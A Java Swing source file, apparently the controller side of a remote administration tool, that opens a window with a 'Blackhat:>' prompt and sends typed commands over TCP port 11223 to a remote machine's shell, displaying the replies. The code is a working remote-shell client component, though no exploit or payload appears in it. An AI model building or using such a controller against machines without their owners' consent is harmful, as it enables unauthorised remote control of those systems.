/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Window;

import Connection.Command;
import java.awt.Cursor;
import java.awt.event.KeyEvent;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

/**
 *
 * @author abaza
 */
public class frmShell extends javax.swing.JInternalFrame {

    private static String InputStr = "";
    private MainGUI MClass = null;

    /**
     * Creates new form frmShell
     *
     * @param MainClass
     */
    public frmShell(MainGUI MainClass) {
        initComponents();
        this.MClass = MainClass;
        this.MClass.Connect(Command.SHELL);
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();

        setClosable(true);
        setIconifiable(true);
        setMaximizable(true);
        setResizable(true);
        addInternalFrameListener(new javax.swing.event.InternalFrameListener() {
            public void internalFrameOpened(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameClosing(javax.swing.event.InternalFrameEvent evt) {
                formInternalFrameClosing(evt);
            }
            public void internalFrameClosed(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameIconified(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameDeiconified(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameActivated(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameDeactivated(javax.swing.event.InternalFrameEvent evt) {
            }
        });

        jTextArea1.setBackground(new java.awt.Color(0, 0, 0));
        jTextArea1.setColumns(80);
        jTextArea1.setFont(new java.awt.Font("Noto Sans", 1, 12)); // NOI18N
        jTextArea1.setForeground(new java.awt.Color(28, 214, 0));
        jTextArea1.setLineWrap(true);
        jTextArea1.setRows(5);
        jTextArea1.setText("Blackhat:>");
        jTextArea1.setWrapStyleWord(true);
        jTextArea1.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                jTextArea1MouseReleased(evt);
            }
        });
        jTextArea1.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                jTextArea1KeyPressed(evt);
            }
        });
        jScrollPane1.setViewportView(jTextArea1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 879, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 552, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jTextArea1MouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTextArea1MouseReleased
        String Data = jTextArea1.getSelectedText();
        this.setTitle(Data);
    }//GEN-LAST:event_jTextArea1MouseReleased

    private void jTextArea1KeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jTextArea1KeyPressed
        if (evt.getKeyCode() == KeyEvent.VK_ENTER) {
            String Prombet = "Blackhat:>";
            InputStr = InputStr.replaceAll("[^\\p{ASCII}]", "");

            if (!InputStr.trim().equals("clear")) {
                jTextArea1.append("\n");
                SendCommand(InputStr.trim());
                InputStr = "";
                jTextArea1.append(Prombet);
                int Pro = jTextArea1.getCaretPosition() - 2;
                Cursor Posiotion = new Cursor(Pro);
                jTextArea1.setCursor(Posiotion);
            } else {
                jTextArea1.setText("");
                jTextArea1.append(Prombet);
                //                int Pro = jTextArea1.getCaretPosition() - 2;
                //                Cursor Posiotion = new Cursor(Pro);
                //                jTextArea1.setCursor(Posiotion);
                InputStr = "";
            }
        } else {
            InputStr += evt.getKeyChar();
        }
    }//GEN-LAST:event_jTextArea1KeyPressed

    private void formInternalFrameClosing(javax.swing.event.InternalFrameEvent evt) {//GEN-FIRST:event_formInternalFrameClosing
        this.MClass.Connect(Command.STOP_SHELL);
    }//GEN-LAST:event_formInternalFrameClosing

    private void SendCommand(String Command) {
        String ResevedCommand = "";
        try {
            Socket socket1 = new Socket(this.MClass.GetCurrentIP(), 11223);
            socket1.setTcpNoDelay(true);
            PrintWriter Pw;
            try (BufferedReader br = new BufferedReader(new InputStreamReader(socket1.getInputStream()))) {
                Pw = new PrintWriter(socket1.getOutputStream(), true);
                Pw.println(Command);
                Pw.flush();
                while ((ResevedCommand = br.readLine()) != null) {
                    jTextArea1.append(ResevedCommand + "\n");
                }
                Pw.close();
                socket1.close();
            }
        } catch (IOException ex) {
        }
    }

//    public void runShellScript(String unixCommand) {
//        try {
//            ProcessBuilder processBuilder = new ProcessBuilder("bash", "-c", unixCommand);
//            processBuilder.redirectErrorStream(true);
//            Process shellProcess = processBuilder.start();
//            BufferedReader reader = new BufferedReader(new InputStreamReader(shellProcess.getInputStream()));
//            String line = "";
//            while ((line = reader.readLine()) != null) {
//                jTextArea1.append(line + "\n");
//            }
//        } catch (IOException ex) {
//        }
//    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea jTextArea1;
    // End of variables declaration//GEN-END:variables
}
